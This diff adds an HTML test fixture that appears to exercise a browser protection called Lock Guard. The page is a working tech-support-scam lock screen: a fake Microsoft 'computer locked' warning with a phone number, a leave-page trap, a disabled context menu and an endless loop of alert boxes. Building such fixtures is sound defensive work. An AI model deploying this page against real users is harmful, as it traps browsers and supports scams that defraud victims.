@@ -1,0 +1,51 @@
+<!doctype html>
+<!--
+  Fixture, not a real attack: a lock screen that holds the tab with an endless run of alert
+  boxes. After five, Lock Guard cuts the run and closes the page. Fictional 555 number.
+-->
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Loading...</title>
+  </head>
+  <body>
+    <script>
+      const lockHtml = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <meta charset="utf-8" />
+          <title>Security warning</title>
+          <style>
+            html, body { height: 100%; margin: 0; }
+            body { background: #0a3fb3; color: #fff; font-family: Segoe UI, Arial, sans-serif; }
+            main { padding: 12vh 10vw; }
+          </style>
+        </head>
+        <body>
+          <main>
+            <h1>Your computer has been locked</h1>
+            <p>Error code 0x80070426. Do not restart your computer.</p>
+            <p>Call Microsoft Support now: 1-800-555-0142</p>
+          </main>
+          <script>
+            window.addEventListener('beforeunload', (event) => {
+              event.preventDefault();
+              event.returnValue = '';
+            });
+            document.addEventListener('contextmenu', (event) => event.preventDefault());
+            // The trap under test: the page never gives control back between alert boxes.
+            setTimeout(() => {
+              while (true) {
+                alert('Your computer is locked. Call 1-800-555-0142.');
+              }
+            }, 1500);
+          <\/script>
+        </body>
+        </html>
+      `;
+      const blob = new Blob([lockHtml], { type: 'text/html' });
+      window.location.href = URL.createObjectURL(blob);
+    </script>
+  </body>
+</html>
